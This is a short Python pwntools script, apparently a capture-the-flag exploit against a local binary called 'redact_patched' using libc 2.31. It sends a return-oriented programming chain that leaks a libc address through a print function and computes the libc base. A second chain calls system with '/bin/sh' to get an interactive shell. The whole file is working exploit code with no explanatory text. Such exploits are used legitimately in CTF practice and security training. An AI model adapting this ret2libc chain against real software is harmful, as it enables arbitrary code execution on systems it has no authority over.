from pwn import *

elf = ELF("./redact_patched")
libc = ELF("./libc-2.31.so",checksec = False)

p = elf.process()

print_func = 0x4010c0

cout = 0x4040c0

gdb.attach(p, 'b *0x401490\n')
sleep(3)
p.sendline(b"")

pop_rdi = 0x40177b
pop_rsi = 0x401779
p.sendline(p64(pop_rdi) + p64(cout) + p64(pop_rsi) + p64(0x404050) + p64(0) + p64(print_func) + p64(0x401203))

p.sendline(b"72")

p.recvuntil(b"redact: \n")

leak = u64(p.recv(6).ljust(8,b'\x00'))

libc.address = leak - libc.sym.__cxa_atexit

info(f"Libc base 0x{libc.address:02x}")

system = system = libc.sym.system
bin_sh = next(libc.search(b"/bin/sh\x00"))

p.sendline(p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(0x401203))
p.sendline(b"72")


p.interactive()